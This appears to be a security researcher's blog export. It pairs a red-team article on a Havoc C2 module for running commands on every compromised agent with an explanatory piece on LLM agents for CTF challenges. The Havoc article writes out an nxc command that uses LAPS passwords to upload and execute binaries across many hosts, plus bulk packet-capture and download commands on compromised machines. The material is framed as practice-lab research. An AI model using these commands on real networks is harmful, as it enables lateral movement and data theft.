{"/about/":{"data":{"":"","other#Other":"\ntldr do hack write code type on keyboard loose CTFs against cracked 15 year olds with 80 years of hacking experience self whoami.txtprogrammer, red teamer, pentester, and jack of all trades with a general passion for pretty much anything cyber. certifications Current list of certifications I’ve achieved.\nOffensive Security Web Expert (OSWE) Offensive Security Experienced Penetration Tester (OSEP) Certified Red Team Operator (CRTO) Certified Red Team Professional (CRTP) Offensive Security Certified Professional (OSCP) CREST Practitioner Security Analyst (CPSA) CREST Registered Penetration Tester (CRT) contact Messages without cute cat or monkey pictures have a higher chance of landing in my spam folder. Do what you will with that information…\nsocials @_fyxme email # email in python def get_email(domain): return \"fegv\" + \"@\" + domain print(get_email(\"proton.me\")) Too hard? Just use this…\nI found this email by bruteforcing protonmail’s username validation endpoint. Couldn’t be bothered to find enough proxies to rotate them and find a valid 3 letter address… Might revisit this in the future.\nwebsite This website is an attempt to document research I do, bugs I find, things I break, tools I make, and useful resources or knowledge I come across. Documenting some of the work I’ve made public.\nThe website is always a work in progress… Your Mileage Will Always Vary.\nsitemap technologies The following tools, libraries and services are used to maintain the website:\nhugo | golang static site generator hextra | hugo theme used as a base (this has been heavily customised and I will most likely fork and divert from it sooner or later) github pages | website hosting cloudflare | domain name renewal (originally registered on namecheap) giphy | da monkee gifs custom python scripts | maintenance, deployment \u0026 other shenanegans to make it compatible with obsidian Optimisation Some optimisations are performed to reduce file sizes and improve overall website speed:\nStripping Metadata from images, GIFs and videos using exiftool Lossless image compression using ffmpeg to convert to webp image format I may write a mini article in the future to explain how these are used, showcase how much size reduction we can achieve and show tricks to leverage the full potential of these tools.\nNo modifications are made to GIFs as they are already very well optimised by Giphy. (Lossy compression is possible)\nhelpers Finding giphy media url The gif websites are super stingy about sharing their .gif urls… I can never remember how to find it, so here goes nothing:\nTake the url: https://giphy.com/gifs/monkey-phone-cell-l41lVsYDBC0UVQJCE Extract the end bit: l41lVsYDBC0UVQJCE Put the fluff around it: https://media.giphy.com/media/\u003cend bit\u003e/giphy.gif Profit: https://media.giphy.com/media/l41lVsYDBC0UVQJCE/giphy.gif ^ This also works for giphy “clips”\nAlternatively, you can use this “downloader”.\nOther The almighty OG website The Almighty OG Website The OG website was a minimalist single page HTML website which would be updated manually and simply contained redirect links to GitHub Markdown files in various repos.\nThe simplicity of it was great but I wanted something more robust with easy markdown conversion and simple site navigation. Also wanted the content to be hosted and displayed on the fyx.me domain and not in random repos on Github.\nSince the website is a self contained html page its easy to keep around and host.\nIf you want to check it out, it’s available here.\nsimplicity This is the only CSS required to style the whole page. Isn’t that just beautiful…\nbody { font-family: monospace; display: flex; } nav { margin-right: 2em; padding: 1em; } ul { margin: 0; padding-left: 1em; } ul.spaced-list \u003e li { margin-bottom: 1ex; } hr { border: 1px solid gray; margin: 2ex 0; } a { text-decoration: none; } a:hover { text-decoration: underline; } body { background-color: #111; color: #fff; } a { color: #3cf; } a:visited { color: #c6f; } A monkey in a human’s world I’m just a monkey lost in a human’s world. This website is my temple. I type on keyboard, code appears. Sometimes the code works, sometimes it doesn’t. But you can’t blame me. I’m just a monkey in a human’s world.\nMy monkey duties include typing on keyboard, clicking on mouse, hitting computer with wrench until IT comes running. But they can’t get mad, they can’t fire me. I’m just a monkey in a human’s world.\nSometimes I finish cigarette and breath in oxygen. This temporary burst of energy helps me do incredible things, like type on computer fast, break software, make machine go brrrrrrrrrr. And then cigarette comes back, and stops me in my tracks. But you can’t blame me. I’m just a monkey in a human’s world.\n~ A monkey in a human’s world","self#self":"","tldr#tldr":"","website#website":""},"title":"About fyx(me)"},"/articles/":{"data":{"":" Articles below are new articles I’ve written after migrating to fyx.me v2.0. A lot of these are new research projects, tool development, and longer pieces of writing on cybersecurity, programming and other tech topics which I find interesting.\nOld articles, CTF/boot2root writeups and post-mortem links can be found at the old website here "},"title":"articles"},"/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/":{"data":{"":" Tldr\nWrote a Havoc Module to run commands on all connected agents, used it to gather network information on all compromised hosts by performing packet captures, and analysed the data offline to map out the environment and find open ports and services. The tool can be found here: https://github.com/fyxme/havoc-runall-poc\nDo you sometimes get this urge to run rm -rf on all your beacons at once? Or maybe you’re a ransomware operator who wants to execute your ransomware BOF through all your beacons? Worry no more, the Havoc Run All Module is here!\nThe Havoc Run All Module allows you to run commands on all connected agents, which could prove useful when searching for something, running post-exploitation on a number of hosts and/or downloading files on all compromised hosts at once.\nNote: executing ransomware this way would actually be stupid since you’d need to have a beacon on every machine you wish to ransom… As is currently done in ransomware operations, its much easier to use GPO, Intune, SCCM or any other software deployment tool. This is only a fun project which will increase IOCs when used and increase the likelihood of being compromised… So ackchyually, I’m doing blue team a favor here. Its ok… Thank me later.","conclusion-and-use-cases#Conclusion and use cases":"The Havoc Run All Module is a fun tool to play around with in test environments but since it generates a lot of IOCs, it wouldn’t be too practical in Red Team engagements unless you’re looking to go all out and validate that the Blue Team can catch you.\nI do see some potential within practice environments like HTB Pro Labs, OffSec OSEP, etc. It’s overall really fun to use and does feel pretty powerful when you don’t have to worry about OPSEC! Combine it with a BOF that searches for flags or does post-exploitation looting and you’ve got yourself a powerful weapon for those pesky practice environments which hide loot everywhere.\nPassive Network Monitoring and analysis has a lot of potential for attackers willing to expand their knowledge of the network without having to actively probe ports and hosts. Definitely something I will investigate further in the future…\nThe Havoc Run All Module can be found here: https://github.com/fyxme/havoc-runall-poc","figuring-out-which-of-my-beacons-are-alive#Figuring out which of my beacons are alive":"The first use case I found for this was to sync all my beacons (using the sleep command) and finding out which of my beacons are alive by running a dummy BOF.\nTo sync all the beacons, I first run sleep 0 on all of them to get them to return all at the same time (some limitations in the current version of Havoc make it unreliable when the beacons do not return at similar intervals):\nhavoc \u003e runall sleep 0 All Havoc beacons synced together To get details about the alive beacons, I’ve created a command (getalive) which run a dummy BOF on all the agents. This BOF returns the hostname and the username of the underlying beacon allowing us to check which beacons are actually alive and which ones might be dead:","future-research#Future Research":" Explore packet analysis further. Develop additional analysis tools to filter, search and visualise PCAP data. SYN-ACK responses indicates open ports but may miss ports if the packet capture was started after the connection occurred Turn the packet analysis C tools into a BOF that can also capture network packets and passively identify open ports without having to export large Packet Capture files over C2 comms Look into trying out GRASSMARLIN which is targeted towards Industrial Control Systems (ICS), however could still be useful to map out an environment from a PCAP ","passively-mapping-out-an-internal-environment-using-packet-captures#Passively mapping out an internal environment using Packet Captures":"With firewalls, network access controls, and network segmentation, it can be tough to identify which machines can talk to which ones. There are tools out there that can help map out a network environment but they require active scanning of target devices. You could also use DNS cache to get an idea of what the machine is trying to talk to but it does not necessarily correlate with what it can reach (eg. DNS for a machine that is firewall/blocked off).\nInstead, we can look at currently outgoing data and see if we can create our own map from passively analysing network packets. To do this, we would need access to Network Routing Device like a switch or we can rely on running packet captures on a large number of hosts within the environment. Since we’re testing out the Havoc Run All Module (and there’s no network device we can compromise), we’ll use the second option and perform a packet capture on all of the hosts we have compromised.\nGathering the data We want to do this in the easiest way possible, without having to install tshark/wireshark or any other tools on the device. Since we’re targeting Windows machines, there are built-in tools we can use:\nThe old school netsh command which can capture network traffic using the netsh trace sub-command The new school pktmon (Packet monitor) which is built-in to Windows, starting in Windows 10 (version 1809). I wasn’t sure which Windows Host versions the environment was running and I didn’t want to check if every single one of those supported the new(ish) pktmon command so I opted for the trusty old school netsh command.\nNote\nIf you need to execute a binary (eg. deploy a beacon) on multiple hosts at once, netexec is a great tool for that.\nnetexec is very powerful and allows you to perform multiple actions with only one command. As such, you can build a netexec (also know as nxc) command to retrieve the LAPS password for multiple hosts, authenticate as the local administrator user to those hosts, upload a binary and execute it via command prompt (or PowerShell) in a single command:\nnxc smb targets.txt -u \"$LAPSUSER\" \"$PASSHASH\" --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" --exec-method atexec --laps where:\ntargets.txt - a text file containing a list of targets you want to compromise $LAPSUSER - the user with permission to access the LAPS password in LDAP $SOURCE_BIN - the binary you wish to upload $TARGET_BIN - the binary name on the receiving host After deploying my beacons using nxc, I was able to connect to them in Havoc and they started pinging back periodically as expected:\nI then started a trace on all the beacons at once using the following commands:\n# start the trace runall powershell netsh trace start capture=yes tracefile=C:\\windows\\temp\\cap.etl # wait like 5-10 minutes for traffic to be generated runall powershell netsh trace stop # wait like 3-5 minutes until the trace is consolidated Console from one of the agents receiving the command Data collection and consolidation takes some time but once it’s completed you should see a message as such:\nConsolidation of data into CAB file At this point we have an ETL file (Microsoft Event Trace Log File) which can be opened by ETW-centric tools like Microsoft Message Analyzer, but cannot be opened by Wireshark and co. Ideally, we want a file format that is supported by most tools which analyse network data, aka we want a PCAP or PCAPng file. As such we can convert the .etl file into a .pcapng file using the etl2pcapng utility tool.\nI couldn’t be bothered to download all the .etl files to a local Windows VM so I’m using noconsolation (A BOF that runs unmanaged PEs inline) to execute etl2pcapng and convert all trace log files to .pcapng:\n# running etl2pcapng to convert etl to pcapng directly on the hosts # --no-output needed on certain OSes like Windows 2016 Server runall yesconsolation --no-output /home/lo/tools/etl2pcapng.exe C:\\windows\\temp\\cap.etl C:\\windows\\temp\\cap.pcapng Converting .etl to .pcapng directly on the hosts Warning\nThere is an issue with some of the automatically imported Havoc BOFs (commands) which cause the client to crash under certain conditions. For example running runall noconsolation will crash the client. To fix it you need to import the BOFs yourself, which is what I’ve done here with the yesconsolation command (noconsolation -\u003e yesconsolation). This is not something I have control over, however from the code updates I’ve seen, it should be fixed in the Havoc re-write version.\nDownloading \u0026 Merging the data At this point we have a .pcapng file for each host which we need to download and merge so we can analyse the data offline. To do this we can use the built-in Havoc download command to retrieve the .pcapng files:\nrunall download C:\\windows\\temp\\mycoolnetwork.pcapng Depending on how large the PCAP is, this may take a while… You can use the last seen tab to know when the file has finished downloading vs when it’s still downloading:\nOnce downloaded, you can navigate to your local Havoc install and find the data/loot folder which is where the downloaded files will be located:\nNow we don’t want to deal with each packet capture one at a time, so instead we can merge them into a single large PCAP file using the mergecap tool (which is part of Wireshark):\nSome tools might not work with pcapng (eg. the free version of NetworkMiner) and require the old school pcap format instead, which we can easily create using tshark (part of Wireshark as well):\nThe old school PCAP format does not have all the bells and whistles of the PCAPng format and therefore may loose some data during conversion. This explains the discrepancy in the file sizes above.\nAnalysing the data Note\nWe didn’t filter the data before combining it, which means 2 systems talking to each other will have generated the same packets (in opposite direction) which would have been captured during data gathering. Hence, if we captured the data correctly, we can assume that we have at least double the amount of packets needed (disregarding packet loss). I’ll leave the packet filtering as an exercise for the reader. Alternatively, we could use the extra packet to compare both hosts to ensure no packet manipulation is being performed between the hosts and perform additional data analysis.\nIgnoring the duplicate packets, we can load this fat PCAP into NetworkMiner to get a quick overview of the environment. You can run NetworkMiner from Linux using mono (the Cross platform, open source .NET framework):\nmono NetworkMiner.exe --noupdatecheck Because its a big file and we’re running NetworkMiner via mono on Linux, this takes a while to process… Probably worth taking a coffee break here. Alternatively, you can probably parse this much faster on windows. But I’m lazy so imma go with the coffee break route instead…\nedit: I’ve been here a while… this is taking a looong time.\nAfter it finally finishes parsing, we get an idea about what we managed to capture, namely:\n44 hosts 1389 DNS queries 61 Credentials (these are mostly hashes) A lot of files (?!) A single host on the 10.10.14.0/24 network, namely my host since I performed the capture when no-one else was using the environment NetworkMiner Hosts Tab NetworkMiner Credentials Tab We can use tshark to generate a table like output of IP Communications and see which hosts are communicating together:\nI tried playing around with python tools but because the PCAP is of decent size, it was quite slow so I resorted to writing a good ol’ C program to parse the PCAP using libpcap which generates a DOT file that can be converted to a graph using GraphViz:\nThe graph above already highlights a few things about the environment:\nRED: my Kali VM; GREEN: the two entrypoints I’m using to gain access to the internal network (ie. jumpboxes); BLUE: the node which connects to nearly every other node in the domain aka the domain controller. We can also see the domain controller is talking to other nodes that I might not have compromised or have no beacon on, namely the IPs 10.10.120.20 and 10.10.122.20. There’s a good reason these don’t appear to be connected to any other node on the network but I’ll this as an exercise for the reader.\nWe can also see the two Google DNS IPs (8.8.8.8 and 8.8.4.4) being connected to the Blue node which indicate that the domain controller is likely using Google DNS server for external DNS queries. It also connects to multiple root name servers, namely e.root-servers.net (192.203.230.10) and g.root-servers.net (192.112.36.4).\nAs such, we have a decent overview of the network. We can also start performing additional data analysis to for example find open ports and services on the network like HTTPS (port 443), RDP (port 3389) and Microsoft SQL Server (port 1433):"},"title":"Creating a Havoc Module to run commands on all agents at once and map out an environment passively"},"/articles/exploring-autonomous-llm-agents-for-capture-the-flag-problem-solving-using-context-engineering-rag-and-open-source-models/":{"data":{"":"","a-quick-introduction-on-llm-agents#A quick introduction on LLM Agents":" TLDR Tested LLMs against CTF tasks and developed my own AI Plain Agent to solve CTF challenges using context engineering and RAG to increase solve rate with open source models. Released a modular tool called Flagseeker which is an AI Plain Agent library developed to test AI Agentic abilities at solving CTF Cybersecurity challenges. Used it against live CTF events and had success solving various challenges. If you already know about AI, LLMs and Agents and simply want to skip the theory parts, I recommend the following sections:\nMaking an interactive TUI Agent: basically v0 of Flagseeker and what started it all. Developing a more robust Agentic solution to solve CTF challenges: making an autonomous agent system using ideas from previous research; increasing stability, speed and observability Retrieval Augmented Generation (RAG): showcasing RAG capabilities with CTF challenges and enhancing our agent’s capabilities by using RAG to retrieve tools relevant to specific challenges. Using Vision Language Models to help solve CTF challenges: Exploring Vision Language Models to help solve image related challenges or extract text/information from images. Capture The Flag (CTF) challenges are a great way to improve your offensive security skill set and test new tools in controlled environments. Only issue is once you’ve done the same stego challenge a million times, it can get boring and repetitive… What if we could leverage LLMs to help us solve these simple challenges and potentially highly attack paths, or even solve harder challenges?\nA quick summary of CTF events: CTFs are basically hacking competitions where teams and/or individuals compete in a controlled environment where they are tasked with a number of challenges in different security categories and their goal is to solve the challenge and retrieve a “flag” (ie. a string that is usually easy to identify and usually follows a given format, eg. flag{this_challenge_was_easy}) . These event are a great way to test your skills and learn new things which can sometimes be applied to real world scenarios but will teach you to always try harder.\nRecently, there’s been a few papers and articles coming out from different research teams and organisations highlighting the potential of using Large Language Models (LLMs) and LLM Agents in CTF events:\nAnthropic recently released their red.anthropic.com blog which highlights Claude’s capabilities in CTF competitions showcasing that LLMs can solve simple-medium CTF challenges, however they still struggle on harder challenges (eg. 0 challenges solved for Plaid CTF and DEF CON CTF Qualifier). They presented their research at DEF CON 33 which you can see here. A number of research studies have been published showcasing LLM’s abilities in solving CTF challenges as well as improvements when crafting specific Prompt and using LLM Agents to improve capabilities and solve harder challenges. As part of this blog, I’m going to focus on a specific paper which has achieved great results using Prompt Engineering; combining a number of prompting techniques to create more powerful Agents. You can read their research paper here and access their code here AIxCC a 2 year competition where teams were tasked to find and fix vulnerabilities in Open Source applications by leveraging Artificial Intelligence completed recently and every competing team had to release their code. This provided an insight into leveraging LLMs to solve cybersecurity issues at scale. Highly recommend spending the time into reading some of the articles of different teams. I suggest starting with Trail of Bits article on the topic. Earlier this month, wilgibbs released a blog about using open AI’s GPT-5 model to solve one of the challenges in the DEF CON CTF finals. DEF CON CTF is regarded as one of the hardest CTF competitions that runs every year and having an LLM solve one of the challenges highlighted the AI technological improvements that we’ve seen recently. You can read his blog post here. That’s a lot of research to explore but after reading so many articles I wanted to also get my hands dirty and see what I could come up with. When I started looking into it, I wanted to set myself a number of goals:\nI wanted to focus on Open Source LLM agents and see how far they can be pushed to solve complex problems like CTF challenges. Closed Source LLMs are great but as LLMs providers become more like LLM Agents (I’ll explain what I mean with in the “What’s so special about GPT-5?” section below), we start wondering how much improvement is coming from the LLM itself vs Agentic improvements. Furthermore, for privacy reasons, companies might want to run their own LLMs instead of sending all their internal information and code to 3rd parties like Open AI. I wanted to attempt to use smaller but more specialised LLMs, for example using a 12B parameters LLM that focuses on only solving Cryptography challenges Ensure the Agent is fully autonomous such that the agent receives no user interaction (apart from starting the agent). Improve the capabilities of smaller agents by leveraging RAG and/or fine tuning A quick introduction on LLM Agents What are LLM Agents An agent is an LLM-powered system designed to take actions and solve complex tasks autonomously. Unlike traditional LLMs, AI agents go beyond simple text generation. They are equipped with additional capabilities, including:\nPlanning and reflection: AI agents can analyze a problem, break it down into steps, and adjust their approach based on new information. Tool access: They can interact with external tools and resources, such as databases, APIs, and software applications, to gather information and execute actions. Memory: AI agents can store and retrieve information, allowing them to learn from past experiences and make more informed decisions. ref: https://www.promptingguide.ai/agents/introduction Agents represent systems that intelligently accomplish tasks, ranging from executing simple workflows to pursuing complex, open-ended objectives. OpenAI\nOne of the main selling points of Agents is that you can leverage them to perform more advanced tasks by giving them access to tools, guiding them to provide structured answers (eg. respond with the following JSON template) and chain tasks/sub-tasks until they solve your problem. CTF challenges can be quite complex and usually require multiple actions/tools in order to solve. Hence, they’re a great testcase for exploring LLM Agents and pushing its boundaries.\nIf you want to learn more about agents, I highly recommend looking at OpenAI’s guide on building agents .\nWhat’s so special about GPT-5? If you’ve played around with GPT-5 (especially its “Thinking” version), you might have realised how good it is at breaking tasks into sub-tasks until it solves your query. It also has access to tools which can be executed during any sub task. In the past, “thinking” traces appeared to be continuous and limited in their capabilities but with the release of GPT-5 the “Thinking” traces appear to be somewhat limitless, continuing until they solve your task. If you’ve played around with LLM agents before, you might have realised that this sounds very similar to some of the techniques used to augment LLM capabilities, namely:\nchain-of-thought process / ReAct Prompting embedded prompt-chaining I explain some of these techniques in a later section: “Improving Agents using Context Engineering and Prompting Techniques”\nTake for example, the following chat showing GPT-5 attempting a networking CTF Challenge from 247CTF.com. You can see it mapping out intermediate steps, trying out different tools and techniques before giving a final answer. The answer is wrong (hence why I’m showing it here) but the way it moves between sub-tasks is very interesting and very thoughtful, using python builtin libraries to parse the packet capture (pcap) file embed in the zip file:\nAfter playing around and reading about GPT-5 a lot, I speculate that there are actually not many direct LLM improvements (ie. data/learning improvements) but instead they trained the model to be more agentic and improved the agent’s flow by leveraging recent prompting techniques (ie. Chain-of-Thought, ReAct, Prompt-Chaining), which I’ll explain in the next section.\nWith that in mind, this means that you may potentially be able to replicate or at least improve other models by incorporating them into similar agent systems. This is one of the reasons that I’m excited to try using Open Source LLMs (especially smaller ones) to see if they can be tuned to perform on par with GPT-5 and other large language models at specialised tasks like solving CTF challenges.\nIf you want to read more about GPT-5 specifically, I recommend the following articles:\nhttps://openai.com/index/introducing-gpt-5/ https://botpress.com/blog/everything-you-should-know-about-gpt-5 https://github.com/elder-plinius/CL4R1T4S/blob/main/OPENAI/ChatGPT5-08-07-2025.mkd https://fi-le.net/oss/ Improving Agents using Context Engineering and Prompting Techniques Info\nIf you already know about context engineering and prompting techniques, I recommend you skip to the next section Making a simple interactive TUI Agent.\nA number of researchers have published techniques and prompting strategies that can be leveraged to enhance responses from AI agents. Using these enhancements allows LLMs to solve more complex challenges, more consistently and/or with fewer steps. They provide a great toolkit to builder who want to tackle more complex problems.\nContext Engineering is a newer term which has started replacing prompt engineering as Agents have evolved to incorporate more than just better prompting. Its a more encompassing term which now includes things like Retrieval Augmented Generation (RAG) to add contextual information to chats, Structured Output to standardise the LLMs response into more predictable formats (ie. JSON) and keeping Memory of past events or actions to adapt LLM responses.\nI’ll introduce a number of context engineering techniques which are discussed in this article and used by the Agent released alongside it.\nChain-of-Thought (CoT) Chain-of-Thought sounds complicated but its actually very simple. The idea is basically to split a task into smaller (more manageable steps). To do this with LLMs, you basically ask them about the first step to solve a problem, then the second step and the next step, and so on until the problem is solved. Newer models who have “Thinking” abilities, can attempt to do Chain-of-Thought directly. However, its harder to manage then simply asking about one step at a time since the model is free to “think” and might get sidetracked quickly, hallucinate or end up in rabbit holes (error propagation).\nAs such, its easier to keep on querying the model for a single thought and then querying it again for the next thought while providing the previous thought. It allows us to manage the context we’re giving the model. We can provide less context such that it doesn’t overwhelm the model with information as research has shown that the more information (ie. context) you provide, the easier it is for the model to hallucinate, forget information and co.\nHere’s a quick example of what Chain-of-Thought might look like in code:\nfrom openai import OpenAI client = OpenAI() system_prompt = \"\"\" You are tasked with providing technical guidance, helping users install Arch Linux. Think step by step and only provide one step at a time. I will provide a list of steps we have taken so far, only give me the next step or command I need to do. If you believe we are done, only reply with \"INSTALLATION COMPLETED!\" \"\"\" done_trigger = \"INSTALLATION COMPLETED!\" installation_succeeded = False steps_performed = list() # Maximum number of steps as fallback # in case we don't succeed in installing Arch Linux max_steps = 100 for _ in range(max_steps): query = \"\" # Add the step history to our query so the Model knows where we're at # and can think about the next step after this if steps_performed: query = \"Here are the steps I have performed:\\n\" for j, step in enumerate(steps_performed): # Note: We could decided to truncate the step description # as it might contain a lot of information and we only want a short summary query += f\"step {j}: {step}\\n\" query += \"What is my next step?\" response = client.responses.create( model=\"gpt-4o-2024-08-06\", input=[ {\"role\": \"system\", \"content\": system_prompt}, {\"role\": \"user\", \"content\": query} ] ) next_step = response.output_text.upper().trim() # The LLM thinks we're done if next_step == done_trigger: installation_succeeded = True break print(f\"Here's our next step: {next_step}\") # ... You could add code here to tell the model if you're running into issues with this steps # and provide some context such that the model tries to help you solve your issues # before moving on to the next step # Adding step to steps performed steps_performed.append(next_step) print(f\"Installation succeeded: {installation_succeeded}\") Planning Planning simply involves asking the model to generate a plan instead of provide a description or single step. This does not seem super useful on its own since LLMs are trained to do this by default. However, when you are combining different agents for different tasks, it becomes a lot more interesting as you can use stronger models for planning, request agents to write plans for next few steps so they don’t get sidetracked and more.\nHere’s a super basic example, which doesn’t add much value on its own:\nfrom openai import OpenAI client = OpenAI() system_prompt = \"You are tasked with providing technical guidance. When a user has a request, give the user a plan of all steps needed to solve his issue.\" query = \"I'm trying to install Arch Linux on this new computer, how do I do it?\" response = client.responses.create( model=\"gpt-4o-2024-08-06\", input=[ {\"role\": \"system\", \"content\": system_prompt}, {\"role\": \"user\", \"content\": query} ] ) print(response.output_text) ReAct ReAct is a general approach that couples an LLM’s reasoning with concrete actions. By prompting the model to produce both intermediate reasoning traces and action steps, the system can plan, revise, and execute tasks dynamically, while also consulting external sources (eg. using web search tools) to bring in new information and refine its reasoning.\nThe best way to explain ReAct prompting is to look at the example provided in the research article which introduce the idea (Yao et al., 2022). For this example, they asked the following question: “What other devices, apart from the Apple Remote, can control the program originally intended for the Apple Remote?” and provided context to the model (ie. Thought, Action and Observation) which helped the model perform step by step analysis and enhance its response based on the information it retrieved from its actions (ie. tools):\nIf you want to read more on the topic I recommend reading the article itself or a quick rundown here.\nPrompt Chaining Prompt chaining refers to basically using different prompts to perform different actions. Our first prompt could be to request a plan from a model and then we create a second request that asks the same or another model to create an action from that plan (ie. combine our planning technique with another model that provides actions).\nSplitting the prompts this way also helps with keeping context small, testing different models for different steps and limiting models to a single action per query instead of letting them go rogue (ie. easier to manage).\nRetrieval Augmented Generation (RAG) Retrieval Augmented Generation (RAG) is a method used to provide additional context to a model by search for information relevant to the task from a database/set of documents.\nRAG takes an input and retrieves a set of relevant/supporting documents given a source (e.g., Wikipedia). The documents are concatenated as context with the original input prompt and fed to the text generator which produces the final output. This makes RAG adaptive for situations where facts could evolve over time. This is very useful as LLMs’s parametric knowledge is static. RAG allows language models to bypass retraining, enabling access to the latest information for generating reliable outputs via retrieval-based generation. ref: https://www.promptingguide.ai/techniques/rag\nFor CTFs, there are a lot of tools and terminal commands that you need to know about and a lot of the time you’ll have to research or look at examples to understand how to run the tools. If we’re able to provide these tools, use-cases and examples, the model can make use of those tools and might be more likely to solve the challenge. Provided that we give the correct tools and information in our query, which is easier said then done…\nThere are two main steps in RAG:\nRetrieval: retrieve relevant information from a knowledge base Generation: insert the relevant information to the prompt for the LLM to generate information However, the retrieval part can be a little complicated and requires some preparation. You can’t simply provide everything you have to a model unless your knowledge base is small and/or the model’s context limit it high. To solve this, most RAG systems will store their database in text embeddings stored in a vector store database. Text embeddings are numerical vectors that represent pieces of text (words, sentences, docs) so that similar meanings have vectors that are close together. Vector stores are simply special databases optimised for vector similarity search (ie. find the vectors most similar to this other vector).\nWith this system, we can store our knowledge base in a special database as vectors and when we’re looking for something we simply convert what we’re looking for to a vector and search for similar vectors in the database.\nHere’s a quick rundown of how this would work step by step:\n# Before requesting information from a model 1. Create a knowledge base 2. Split that knowledge based into documents (ie. chunks of text) and create text embeddings for each document 3. Store those embeddings in a vector store database # When querying for information 1. Request the topic/question/query from the user 2. Convert that query to text embedding(s) as before 3. Search your database for the most similar vectors 4. Send the user's query to an LLM alongside the documents with the most similar vectors to help the LLM respond to the user's query 5. Retrieve the LLM's response and provide it to the user This sounds easy but in practice, there are many edge cases which might affect the effective of your RAG Agent such as:\nNoisy, outdated, or duplicated documents leading to bad answers Chunking issues (eg. you have a knowledge base with bash commands but your chunks cut through those commands by mistake so you might have one part of a command in a chunk and one part in another) Using different embedding models Ambiguous queries (eg. “what’s the new policy?” - New relative to when? What type of policy?) Security issues like (indirect) prompt injection and a lot more….. If you want to look at a basic RAG code example, I recommend looking at the following Jupyter notebook by mistral.ai.\nStructured Output JSON is one of the most widely used formats in the world for applications to exchange data. Structured Outputs is a feature that ensures the model will always generate responses that adhere to your supplied JSON Schema, so you don’t need to worry about the model omitting a required key, or hallucinating an invalid enum value. ~ OpenAI\nYou basically give the model a format to follow, this will usually be a JSON schema. Some SDKs and inference providers support it directly so you don’t need to write pure JSON but instead can do something like this.\nfrom openai import OpenAI from pydantic import BaseModel client = OpenAI() # This is the format I want the model to follow class MovieResponseFormat(BaseModel): title: str rating: int actors: list[str] response = client.responses.parse( model=\"gpt-4o-2024-08-06\", input=[ {\"role\": \"system\", \"content\": \"You're a movie title expert. Provie Movie recommendations based on the user's preferences.\"}, { \"role\": \"user\", \"content\": \"I like action and comedy movies\", }, ], text_format=MovieResponseFormat, ) # The parsed value will be a MovieTitle object movie = response.output_parsed # And you can use it as such print(\"Suggested movie\", movie.title, movie.actors) If you look at the API chat response, it should look something like this:\n{ \"title\": \"My beautiful movie\", \"rating\": 5, \"actors\": [\"Jacob\", \"Adam\", \"Paul\"] } Something to note, older or smaller models might not always follow response format instructions and therefore might respond with invalid json or no json at all, potentially causing bugs or exceptions in your code.","appendix#Appendix":"Using Vision Language Models to help solve CTF challenges I’ve been thinking about using image models to help solve certain challenges like the picoCTF challenge below (although Vision Language Models might not be necessary here, you could probably do better with OpenCV). I first tried with the Moondream.ai vision model which is a 2B parameters model but very capable from previous testing, its not bad but needs some work:\nI managed to get better results using GLM-4.5V model which correctly extracted the text from the image:\nI also tested it on another challenge which uses NATO flag signaling although both models didn’t seem to understand it. More testing to be done…\nTopping the leaderboards Winner winner chicken dinner:\nThe only provider decided to stop providing the model (feelsbadman):\nPlain LLM Agents Plain LLM agents are simple agents that use a large language model (LLM) directly to choose next actions or generate task steps without extra layers like complex planners, learned policies, or specialized orchestration frameworks.\nKey characteristics:\nSingle-step decisioning: the LLM is prompted to decide the next action each turn (e.g., call a tool, ask a question, produce text). Minimal state management: little or no explicit memory, belief model, or long-term planning beyond what’s kept in the prompt/history. No learned controller: decisions rely on prompt engineering and the LLM’s reasoning, not on a separate trained policy network. Tool-driven behavior: often constrained to a fixed set of tools or API calls the LLM can invoke via structured outputs. Reactive and iterative: acts, observes results, and prompts the LLM again—adapting only through updated context. When to use:\nPrototyping agents quickly. Tasks where short-horizon, conversational reasoning suffices. Systems prioritizing simplicity and interoperability. Limitations:\nPoor scalability for long, complex plans. Fragile to prompt drift and verbose histories. Limited ability to optimize across multiple steps or maintain consistent long-term strategies. Additional References Prompt engineering:\nhttps://www.promptingguide.ai/ https://google.github.io/adk-docs/agents/workflow-agents/loop-agents/ https://github.com/elder-plinius/CL4R1T4S/blob/main/OPENAI/ChatGPT5-08-07-2025.mkd CTF Agents research papers and blog posts:\nhttps://arxiv.org/abs/2412.02776 https://arxiv.org/pdf/2403.05530 https://arxiv.org/pdf/2403.13793 https://enigma-agent.com/ https://wilgibbs.com/blog/defcon-finals-mcp/ https://github.com/aliasrobotics/cai https://github.com/enigma-agent/ https://github.com/princeton-nlp/intercode/ Agent design patterns:\nhttps://www.philschmid.de/agentic-pattern RAG: - https://www.reddit.com/r/OpenAI/comments/1bjtz7y/when_do_we_use_llm_fine_tuning_vs_llm_rag/ - https://docs.unsloth.ai/get-started/beginner-start-here/faq-+-is-fine-tuning-right-for-me#is-rag-always-better-than-fine-tuning - https://x.com/rohanpaul_ai/status/1961990185698337156 - https://arxiv.org/abs/2508.21038 - https://learn.microsoft.com/en-us/azure/architecture/ai-ml/guide/rag/rag-solution-design-and-evaluation-guide\nOpen Source LLMs used:\ndeepseek v3 llama 3.3 70b llama 7b/8b mistral nemo 12b gpt oss 120b bytedance seed 36b ","conclusion-and-research-outcomes#Conclusion and research outcomes":"Research Outcome Learned a lot through this, understanding how agents and models work, how to improve their capabilities what they are good at and what they might need help with… The Agent I made is very early into development, there’s still a lot of improvements possible which I will definitely explore in the future. Although future articles will be more to the point… Nevertheless, I was able to augment capabilities using RAG which are opening up ideas for future enhancements and hopefully help small open source LLMs bridge the gap and compete with large closed source models.\nThe agentic solution has already proven itself against live events! I will definitely do more testing in future events and try to see what can be improved further.\nFurthermore, I’m excited to try and incorporate self-improvement into RAG by automatically saving and optimising solve paths into command examples and what not as well as trying out finetuning. Obviously more data will be needed for this but with the new setup, I believe it will be easier to create new benchmarks from past and future CTFs and save challenges to train on. Also, I believe adding vision capabilities and deep research could be interesting and might be required to solve certain challenges. Food for thought.\nThe future of CTFs Are CTFs doomed? Short answer, probably not… CTFs have always been a good way to gain knowledge in new topics and a still an amazing way to learn and hone your skills in training environments.\nIf you play CTFs to learn about cyber security, this will not change and will still be a great way to learn. There are and still will be CTFs aimed at newcomers and people wanting to explore new skills.\nIf you’re playing CTFs competitively, you’re going to have to adapt quite a bit. LLMs are here to stay and are now able to do a lot of the grunt work. You’ll need to learn how to leverage them to gain an advantage against other teams. Historically difficult CTFs 